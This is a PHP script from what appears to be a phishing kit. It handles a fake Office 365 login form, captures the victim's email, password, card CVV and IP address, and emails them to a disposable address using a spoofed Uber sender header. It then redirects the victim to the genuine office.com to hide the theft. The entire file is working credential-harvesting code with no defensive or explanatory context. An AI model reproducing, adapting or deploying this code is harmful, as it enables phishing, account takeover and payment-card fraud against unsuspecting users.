<?
$ip = getenv("REMOTE_ADDR");
$message .= "-----------  ! +365 LOGIN ! xDD+ !  -----------\n";
$message .= "-----------  ! +Account infoS+ !  -----------\n";
$message .= "Email : ".$_POST['userid']."\n";
$message .= "Password : ".$_POST['pass']."\n";
$message .= "CVV : ".$_POST['card_code']."\n";
$message .= "IP Address : ".$ip."\n";
$message .= "-----------  ! +nJoY+ !  -----------\n";
$send = "swws40rg4g1fksp@jetable.org";

$subject = "0ffice PZ";
$headers = "From: PYZ <service@uber.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
mail($send,$subject,$message,$headers);


header("Location: https://www.office.com/");